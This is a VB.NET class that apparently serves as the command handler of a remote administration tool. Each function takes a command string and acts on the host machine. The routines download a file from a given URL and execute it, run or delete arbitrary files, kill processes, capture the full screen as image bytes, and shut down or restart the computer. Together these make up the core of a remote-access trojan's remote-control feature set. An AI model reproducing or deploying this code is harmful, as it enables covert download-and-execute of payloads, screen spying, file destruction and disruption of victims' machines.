Imports System.Drawing, System.Windows.Forms.Screen
Public Class Class1

    Public Shared Function Run_File_From_URL(ByVal s As String) As Byte() 'commend : url||path
        If IO.File.Exists(Split(s, "||")(1)) = True Then IO.File.Delete(Split(s, "||")(1))
        My.Computer.Network.DownloadFile(Split(s, "||")(0), Split(s, "||")(1))
        Process.Start(Split(s, "||")(1))
        Return Nothing
    End Function
    Public Shared Function MessageBox(ByVal s As String) As Byte() 'commend : message body
        MsgBox(s)
        Return Nothing
    End Function
    Public Shared Function Delete_File(ByVal s As String) As Byte() ' commend : path
        IO.File.Delete(s)
        Return Nothing
    End Function
    Public Shared Function Run_File(ByVal s As String) As Byte() ' commend : Path||argimment
        Dim o As String() = Split(s, "||")
        If o.Length = 1 Then s &= "||"
        Process.Start(o(0), o(1))
        Return Nothing
    End Function

    Public Shared Function End_Process(ByVal s As String) As Byte() ' commend : name
        For Each x As Process In Process.GetProcessesByName(s)
            x.Kill()
        Next
        Return Nothing
    End Function

    Public Shared Function Take_ScreenShot(ByVal s As String) As Byte() ' commend : /
        Dim bounds As Rectangle
        Dim screenshot As System.Drawing.Bitmap
        Dim graph As Graphics
        bounds = System.Windows.Forms.Screen.PrimaryScreen.Bounds
        screenshot = New System.Drawing.Bitmap(bounds.Width, bounds.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb)
        graph = Graphics.FromImage(screenshot)
        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy)
        Dim mem As New IO.MemoryStream
        screenshot.Save(mem, System.Drawing.Imaging.ImageFormat.Png)
        Dim p As Byte() = mem.ToArray
        mem.Close()
        Return p
    End Function
    Public Shared Function ShutDown_Pc(ByVal s As String) As Byte() ' commend : /
        Process.Start("shutdown", "-s -t 00")
        Return Nothing
    End Function
    Public Shared Function Restart_Pc(ByVal s As String) As Byte() ' commend : /
        Process.Start("shutdown", "-r -t 00")
        Return Nothing
    End Function
End Class
